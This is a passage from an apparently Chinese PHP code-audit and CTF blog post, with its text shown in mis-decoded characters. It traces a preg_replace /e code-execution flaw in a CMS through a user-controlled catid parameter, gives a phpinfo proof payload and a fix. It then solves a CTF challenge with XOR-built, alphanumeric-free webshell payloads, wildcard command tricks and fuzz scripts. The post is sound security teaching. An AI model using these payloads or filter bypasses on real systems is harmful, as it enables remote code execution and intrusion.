ï¼Œä¸”ä½¿ç”¨äº† <strong>&#x2F;e</strong> æ¨¡å¼ã€‚å¦‚æœ <code>$form[$name][&#39;default&#39;]</code> çš„å†…å®¹è¢«æ­£åˆ™åŒ¹é…åˆ°ï¼Œå°±ä¼šæ‰§è¡Œ <strong>eval</strong> å‡½æ•°ï¼Œå¯¼è‡´ä»£ç æ‰§è¡Œã€‚å…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>  <span class="function"><span class="keyword">function</span> <span class="title">getform</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$form</span>, <span class="variable">$field</span>, <span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line"><span class="number">2</span>      <span class="keyword">if</span> (<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>) &amp;&amp; <span class="keyword">isset</span>(setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>)][<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">3</span>          <span class="variable">$form</span>[<span class="variable">$name</span>] = setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;table&#x27;</span>)][<span class="variable">$name</span>];</span><br><span class="line"><span class="number">4</span>      <span class="keyword">if</span> (<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>) &amp;&amp; <span class="keyword">isset</span>(setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>)][<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">5</span>          <span class="variable">$form</span>[<span class="variable">$name</span>] = setting::<span class="variable">$var</span>[<span class="title function_ invoke__">get</span>(<span class="string">&#x27;form&#x27;</span>)][<span class="variable">$name</span>];</span><br><span class="line"><span class="number">6</span>      <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]))</span><br><span class="line"><span class="number">7</span>          <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/\&#123;\?([^\&#125;]+)\&#125;/e&#x27;</span>, <span class="string">&quot;eval(&#x27;return <span class="subst">$1</span>;&#x27;)&quot;</span>, <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]);</span><br><span class="line"><span class="number">8</span>      <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$data</span>[<span class="variable">$name</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>]))</span><br><span class="line"><span class="number">9</span>          <span class="variable">$data</span>[<span class="variable">$name</span>] = <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>];</span><br><span class="line"><span class="number">10</span>     <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/templat/&#x27;</span>, <span class="variable">$name</span>) &amp;&amp; <span class="keyword">empty</span>(<span class="variable">$data</span>[<span class="variable">$name</span>]))</span><br><span class="line"><span class="number">11</span>         <span class="variable">$data</span>[<span class="variable">$name</span>] = <span class="variable">$form</span>[<span class="variable">$name</span>][<span class="string">&#x27;default&#x27;</span>];</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å†æ¥çœ‹çœ‹è¿™ä¸ª <strong>getform()</strong> å‡½æ•°åœ¨ä½•å¤„è¢«å¼•ç”¨ã€‚é€šè¿‡æœç´¢ï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°åœ¨ <strong>Cache&#x2F;template&#x2F;default&#x2F;manage&#x2F;guestadd.php</strong> ç¨‹åºä¸­ï¼Œè°ƒç”¨äº†æ­¤å‡½æ•°ã€‚è¿™é‡Œæˆ‘ä»¬éœ€è¦å…³æ³¨ <strong>catid</strong> (ä¸‹å›¾ <strong>ç¬¬4è¡Œ</strong> ä»£ç )ï¼Œå› ä¸º <strong>catid</strong> ä½œä¸º <strong>$name</strong> åœ¨ <strong>preg_preolace()</strong> å‡½æ•°ä¸­ä½¿ç”¨åˆ°ï¼Œè¿™æ˜¯æˆ‘ä»¬æˆåŠŸåˆ©ç”¨æ¼æ´çš„å…³é”®ã€‚ <strong>guestadd.php</strong> ä¸­çš„å…³é”®ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-2.png"></p><p>é‚£ä¹ˆé—®é¢˜æ¥äº†ï¼Œ <strong>catid</strong> æ˜¯åœ¨ä½•å¤„å®šä¹‰çš„ï¼Œæˆ–è€…è¯´ä¸ä»€ä¹ˆæœ‰å…³ï¼Ÿé€šè¿‡æœç´¢ï¼Œæˆ‘ä»¬å‘ç° <strong>lib&#x2F;table&#x2F;archive.php</strong> æ–‡ä»¶ä¸­çš„ <strong>get_form()</strong> å‡½æ•°å¯¹å…¶è¿›è¡Œäº†å®šä¹‰ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¯¥å‡½æ•° <strong>return</strong> äº†ä¸€ä¸ªæ•°ç»„ï¼Œæ•°ç»„é‡ŒåŒ…å«äº†<strong>catid</strong> ã€ <strong>typeid</strong> ç­‰å‚æ•°å¯¹åº”çš„å†…å®¹ã€‚ä»”ç»†æŸ¥çœ‹ï¼Œå‘ç°å…¶ä¸­åˆåµŒå¥—ç€ä¸€ä¸ªæ•°ç»„ã€‚åœ¨ <strong>ç¬¬6è¡Œå¤„</strong> å‘ç°äº† <strong>default</strong> å­—æ®µï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬ä¸Šé¢æåˆ°çš„ <code>$form[$name][&#39;default&#39;]</code> ã€‚</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-3.png"></p><p>è€Œä¸Šå›¾ <strong>ç¬¬6è¡Œ</strong> çš„ <strong>get()</strong> æ–¹æ³•åœ¨ <strong>lib&#x2F;tool&#x2F;front_class.php</strong> ä¸­ï¼Œå®ƒæ˜¯ç¨‹åºå†…éƒ¨å°è£…çš„ä¸€ä¸ªæ–¹æ³•ã€‚å¯ä»¥çœ‹åˆ°æ ¹æ®ç”¨æˆ·çš„è¯·æ±‚æ–¹å¼ï¼Œ <strong>get()</strong> æ–¹æ³•ä¼šè°ƒç”¨ <strong>front</strong> ç±»ç›¸åº”çš„ <strong>get</strong> æ–¹æ³•æˆ– <strong>post</strong> æ–¹æ³•ï¼Œå…·ä½“ä»£ç å¦‚ä¸‹ï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-4.png"></p><p> <strong>front</strong> ç±»çš„ <strong>get</strong> æ–¹æ³•å’Œ <strong>post</strong> æ–¹æ³•å¦‚ä¸‹ï¼Œçœ‹åˆ°å…¶åˆ†åˆ«å¯¹åº”é™æ€æ•°ç»„</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-5.png"></p><p>ç»§ç»­è·Ÿè¿›é™æ€æ–¹æ³• <strong>get</strong> å’Œ <strong>post</strong> ï¼Œå¯ä»¥çœ‹åˆ°åœ¨ <strong>front</strong> ç±»ä¸­å®šä¹‰çš„é™æ€å±æ€§</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-6.png"></p><p>è¿™å°±æ„å‘³ç€å‰é¢è¯´çš„ <code>$form[$name][&#39;default&#39;]</code> ä¸­ <strong>name</strong> å’Œ <strong>default</strong> çš„å†…å®¹ï¼Œéƒ½æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ã€‚</p><p>æˆ‘ä»¬å±¡ä¸€ä¸‹æ€è·¯ï¼Œ<strong>get_form</strong> å‡½æ•°å®šä¹‰äº† <strong>catid</strong> çš„å€¼ï¼Œ <strong>catid</strong> å¯¹åº”çš„ <strong>default</strong> å­—æ®µåˆå­˜åœ¨ä»£ç æ‰§è¡Œæ¼æ´ã€‚è€Œ <strong>catid</strong> çš„å€¼ç”± <strong>get(â€˜catidâ€™)</strong> å†³å®šï¼Œè¿™ä¸ª <strong>get(â€˜catidâ€™)</strong> åˆæ˜¯ç”¨æˆ·å¯ä»¥æ§åˆ¶çš„ã€‚æ‰€ä»¥æˆ‘ä»¬ç°åœ¨åªè¦æ‰¾åˆ°è°ƒç”¨ <strong>get_form</strong> å‡½æ•°çš„åœ°æ–¹ï¼Œå³å¯è§¦å‘è¯¥æ¼æ´ã€‚é€šè¿‡æœç´¢ï¼Œæˆ‘ä»¬å‘ç°åœ¨ <strong>&#x2F;lib&#x2F;default&#x2F;manage_act.php</strong> æ–‡ä»¶çš„ç¬¬10è¡Œè°ƒç”¨äº† <strong>get_form()</strong> å‡½æ•°ï¼Œé€šè¿‡ <strong>View</strong> æ¨¡æ¿ç›´æ¥æ¸²æŸ“åˆ°å‰å°æ˜¾ç¤ºï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-7.png"><br>è¿™å°±å½¢æˆäº†è¿™å¥—ç¨‹åºæ•´ä½“çš„ä¸€ä¸ªæ‰§è¡Œæµç¨‹ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-8.png"></p><h3 id="æ¼æ´éªŒè¯"><a href="#æ¼æ´éªŒè¯" class="headerlink" title="æ¼æ´éªŒè¯"></a>æ¼æ´éªŒè¯</h3><p>1ã€é¦–å…ˆæ‰“å¼€é¦–é¡µï¼Œç‚¹å‡»æ¸¸å®¢æŠ•ç¨¿</p><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-9.png"></p><p>2ã€è¿›å…¥åˆ°ç›¸åº”çš„é¡µé¢ï¼Œä¼ ç»™catidå€¼ï¼Œè®©ä»–åŒ¹é…åˆ° <code>/\&#123;\?([^&#125;]+)\&#125;/e</code> è¿™ä¸€å†…å®¹ï¼Œæ­£åˆ™åŒ¹é…çš„å†…å®¹ä¹Ÿå°±æ˜¯ <code>&#123;?(ä»»æ„å†…å®¹)&#125;</code> ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ„é€ payloadï¼š <strong>catid&#x3D;{?(phpinfo())}</strong> </p><h3 id="ä¿®å¤æ–¹æ¡ˆ"><a href="#ä¿®å¤æ–¹æ¡ˆ" class="headerlink" title="ä¿®å¤æ–¹æ¡ˆ"></a>ä¿®å¤æ–¹æ¡ˆ</h3><p>æ¼æ´æ˜¯ <strong>preg_replace()</strong> å­˜åœ¨ <strong>&#x2F;e</strong> æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå¦‚æœæ­£åˆ™åŒ¹é…æˆåŠŸï¼Œä¼šé€ æˆä»£ç æ‰§è¡Œæ¼æ´ï¼Œå› æ­¤ä¸ºäº†é¿å…è¿™æ ·çš„é—®é¢˜ï¼Œæˆ‘ä»¬é¿å…ä½¿ç”¨ <strong>&#x2F;e</strong> æ¨¡å¼ä¿®æ­£ç¬¦ï¼Œå¦‚ä¸‹å›¾ç¬¬7è¡Œï¼š<br><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-10.png"></p><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a>é¢˜ç›®</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="comment">// $hint = &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Day8</strong> çš„é¢˜ç›®æ¥è‡ª8æœˆä»½ <strong>é‡‘èä¸šç½‘ç»œå®‰å…¨æ”»é˜²æ¯”èµ›</strong> ï¼Œå†™é¢˜è§£çš„æ—¶å€™å‘ç° <strong>ä¿¡å®‰ä¹‹è·¯</strong> å·²ç»å†™äº†å¾ˆå¥½çš„é¢˜è§£ï¼Œå…·ä½“å¯ä»¥ç‚¹ <a href="https://mp.weixin.qq.com/s/fCxs4hAVpa-sF4tdT_W8-w">è¿™é‡Œ</a> ï¼Œæ‰€ä»¥æ¥ä¸‹æ¥æˆ‘åªä¼šæåŠå…³é”®éƒ¨åˆ†ã€‚</p><p>è¿™é“é¢˜ç›®å®é™…ä¸Šæ˜¯è€ƒå¯Ÿä¸åŒ…å«å­—æ¯æ•°å­—çš„webshellåˆ©ç”¨ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒ <strong>phithon</strong> å¸ˆå‚…çš„æ–‡ç« ï¼š<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a> ï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ å¹¶è°ƒç”¨ <strong>getFlag</strong> å‡½æ•°å³å¯è·å¾—flagã€‚æ’é™¤è¿™é‡Œæ­£åˆ™çš„é™åˆ¶ï¼Œæ­£å¸¸çš„æƒ³æ³•payloadåº”è¯¥ç±»ä¼¼è¿™æ ·ï¼ˆæŠŠä¸Šå›¾ä»£ç ä¸­çš„æ­£åˆ™åŒ¹é…æ³¨é‡Šæ‰è¿›è¡Œæµ‹è¯•ï¼‰ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.php?code=<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line">index.php?code=<span class="variable">$_GET</span>[_]();&amp;_=getFlag</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç°åœ¨å†æ¥è€ƒè™‘è€ƒè™‘å¦‚ä½•ç»•è¿‡è¿™é‡Œçš„æ­£åˆ™ã€‚æ¸¸æˆè§„åˆ™å¾ˆç®€å•ï¼Œè¦æ±‚æˆ‘ä»¬ä¼ å…¥çš„ <strong>code</strong> å‚æ•°ä¸èƒ½å­˜åœ¨å­—æ¯åŠæ•°å­—ï¼Œè¿™å°±å¾ˆå®¹æ˜“æƒ³åˆ° <strong>phithon</strong> å¸ˆå‚…çš„ <a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">ä¸€äº›ä¸åŒ…å«æ•°å­—å’Œå­—æ¯çš„webshell</a> ä¸€æ–‡ã€‚é€šè¿‡å¼‚æˆ– <strong>^</strong> è¿ç®—ã€å–å <strong>~</strong> è¿ç®—ï¼Œæ„é€ å‡ºæˆ‘ä»¬æƒ³è¦çš„å­—ç¬¦å°±è¡Œã€‚è¿™é‡Œæˆ‘ä»¬ç›´æ¥çœ‹ <strong>payload</strong> ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬æ¥æ‹†è§£åˆ†æä¸€ä¸‹ <strong>payload</strong> ï¼Œ<strong>eval</strong> å‡½æ•°ä¼šæ‰§è¡Œå¦‚ä¸‹å­—ç¬¦ä¸²ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);&amp;_=getFlag</span><br><span class="line">æ‹†è§£å¦‚ä¸‹ï¼š        ç¬¬<span class="number">1</span>ä¸ªGETè¯·æ±‚å‚æ•°ï¼šcode                &amp;     ç¬¬<span class="number">2</span>ä¸ªGETè¯·æ±‚å‚æ•°ï¼š_</span><br><span class="line">   <span class="variable">$_</span>=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;         $&#123;<span class="variable">$_</span>&#125;[_]($&#123;<span class="variable">$_</span>&#125;[__]);     &amp;     _=getFlag</span><br><span class="line">   <span class="variable">$_</span>=<span class="string">&quot;_GET&quot;</span>;                <span class="variable">$_GET</span>[_](<span class="variable">$_GET</span>[__]);     &amp;     _=getFlag</span><br><span class="line">                             <span class="title function_ invoke__">getFlag</span>(<span class="variable">$_GET</span>[__]);</span><br><span class="line">                             <span class="title function_ invoke__">getFlag</span>(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure><p>è¿™ä¸ª <strong>payload</strong> çš„é•¿åº¦æ˜¯ <strong>37</strong> ï¼Œç¬¦åˆé¢˜ç›®è¦æ±‚çš„ <strong>å°äºç­‰äº40</strong> ã€‚å¦å¤–ï¼Œæˆ‘ <strong>fuzz</strong> å‡ºäº†é•¿åº¦ä¸º <strong>28</strong> çš„ <strong>payload</strong> ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=<span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;%1c%1e%0f%3d%17%1a%1c&quot;</span>;<span class="variable">$_</span>();</span><br></pre></td></tr></table></figure><p>è¿™é‡Œä¹Ÿç»™å‡º <strong>fuzz</strong> è„šæœ¬ï¼Œæ–¹ä¾¿å¤§å®¶è¿›è¡Œ <strong>fuzz</strong> æµ‹è¯•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">str_split</span>(<span class="string">&#x27;getFlag&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$ch</span> = <span class="string">&#x27;&#123;&#x27;</span>^ <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$ch</span>, <span class="variable">$a</span> , <span class="literal">true</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&#123; ^ chr(&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;) = <span class="subst">$ch</span>&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="title function_ invoke__">chr</span>(<span class="number">28</span>).<span class="title function_ invoke__">chr</span>(<span class="number">30</span>).<span class="title function_ invoke__">chr</span>(<span class="number">15</span>).<span class="title function_ invoke__">chr</span>(<span class="number">61</span>).<span class="title function_ invoke__">chr</span>(<span class="number">23</span>).<span class="title function_ invoke__">chr</span>(<span class="number">26</span>).<span class="title function_ invoke__">chr</span>(<span class="number">28</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/14/WebSecurity/codeaudit/phpaudit3/image-11.png"></p><p>åæ¥åœ¨å®‰å…¨å®¢çœ‹åˆ°ä¸€ç§æ–°çš„æ€è·¯ï¼Œä¹Ÿå¾ˆä¸é”™ï¼Œå…·ä½“å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/154284">CTFé¢˜ç›®æ€è€ƒâ€“æé™åˆ©ç”¨</a> ã€‚è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯ <strong>åˆ©ç”¨é€šé…ç¬¦è°ƒç”¨Linuxç³»ç»Ÿå‘½ä»¤</strong> æ¥æŸ¥çœ‹ <strong>flag</strong> ï¼Œå…³äºé€šé…ç¬¦è°ƒç”¨å‘½ä»¤çš„æ–‡ç« ï¼Œå¤§å®¶å¯ä»¥å‚è€ƒï¼š <a href="https://www.anquanke.com/post/id/145518">webåº”ç”¨é˜²ç«å¢™é€ƒé€¸æŠ€æœ¯ï¼ˆä¸€ï¼‰</a> ã€‚</p><p>æˆ‘ä»¬æ¥åˆ†æå®‰å…¨å®¢è¿™ç¯‡æ–‡ç« ä¸­çš„payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=`/???/??? /????`;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$_</span><span class="meta">?&gt;</span></span><br><span class="line">å®é™…ä¸Šç­‰ä»·äºï¼š</span><br><span class="line"><span class="variable">$_</span>=`/bin/cat /FLAG`;<span class="meta">?&gt;</span><span class="meta">&lt;?=</span><span class="variable">$_</span><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘æƒ³è¯´ä¸€ä¸‹ <strong><?=$_?></strong> è¿™ä¸ªä»£ç çš„æ„æ€ã€‚å®é™…ä¸Šè¿™ä¸²ä»£ç ç­‰ä»·äº <strong><? echo $_?></strong> ã€‚å®é™…ä¸Šï¼Œå½“ <strong>php.ini</strong> ä¸­çš„ <strong>short_open_tag</strong> å¼€å¯çš„æ—¶å€™ï¼Œ <strong><? ?></strong> çŸ­æ ‡ç­¾å°±ç›¸å½“äº <strong><?php ?></strong> ï¼Œ <strong><?=$_?></strong> ä¹Ÿç­‰ä»·äº <strong><? echo $_?></strong> ï¼Œè¿™ä¹Ÿå°±è§£å†³äº†è¾“å‡ºç»“æœçš„é—®é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index2.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Too Long.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not Allowed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(__FILE);</span><br><span class="line"><span class="comment">// $hint = &quot;php function getFlag() to get flag&quot;;</span></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ç›®å®é™…ä¸Šå’Œä¸Šé¢é‚£é“é¢˜ç›®å·®ä¸å¤šï¼Œåªæ˜¯è¿‡æ»¤äº†ä¸€ä¸ªä¸‹åˆ’çº¿ <strong>_</strong> è€Œå·²ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸­æ–‡æ¥åšå˜é‡åï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$å“¼=<span class="string">&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;%1c%1e%0f%3d%17%1a%1c&quot;</span>;$å“¼();</span><br></pre></td></tr></table></figure><p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ <strong>fuzz</strong> å¯ç”¨çš„ <strong>ASCII</strong> åšå˜é‡åï¼Œ<strong>fuzz</strong> ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">256</span>):</span><br><span class="line">    asc = <span class="string">&quot;%%%02x&quot;</span> % i</span><br><span class="line">    url = <span class="string">&#x27;http://localhost/demo/index2.php?code=$%s=&quot;&#123;&#123;&#123;&#123;&#123;&#123;&#123;&quot;^&quot;%%1c%%1e%%0f%%3d%%17%%1a%%1c&quot;;$%s();&#x27;</span> % (asc,asc)</span><br><span class="line">    r = requests.get(url)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;HRCTF&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s å¯ç”¨&quot;</span> %asc)</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ­¤æ—¶ <strong>payload</strong> é•¿åº¦ä¸º <strong>28</strong> ã€‚å½“ç„¶è¿˜æœ‰å…¶ä»– <strong>payload</strong> ï¼Œä¾‹å¦‚ä¸‹é¢è¿™æ ·çš„ï¼ŒåŸç†éƒ½å·®ä¸å¤šï¼Œå¤§å®¶è‡ªè¡Œç†è§£ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$å‘µ=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$å‘µ&#125;[å‘µ]($&#123;$å‘µ&#125;[å‘µ]);&amp;å‘µ=getFlag</span><br></pre></td></tr></table></figure><p><a href="https://521-wf.com/archives/45.html">preg_replaceçš„&#x2F;eä¿®é¥°ç¬¦å¦™ç”¨ä¸æ…ç”¨</a><br><a href="https://xz.aliyun.com/t/1290">è€æ´æ–°å§¿åŠ¿ï¼Œè®°ä¸€æ¬¡æ¼æ´æŒ–æ˜å’Œåˆ©ç”¨(PHPMailer RCE)</a></p><h2 id="Day9-Rabbit"><a 